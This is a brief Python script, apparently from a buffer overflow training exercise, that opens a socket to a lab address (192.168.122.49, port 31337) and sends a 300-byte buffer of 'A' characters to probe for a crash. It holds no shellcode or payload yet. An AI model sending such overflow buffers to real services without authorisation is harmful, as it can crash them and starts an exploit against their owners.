#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

import socket
from struct import pack

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.122.49',31337))

buffer = b"A" * 300 + b"\n"

print("[+] Enviando buffer de 300 Bytes [+]")

client.send(buffer)
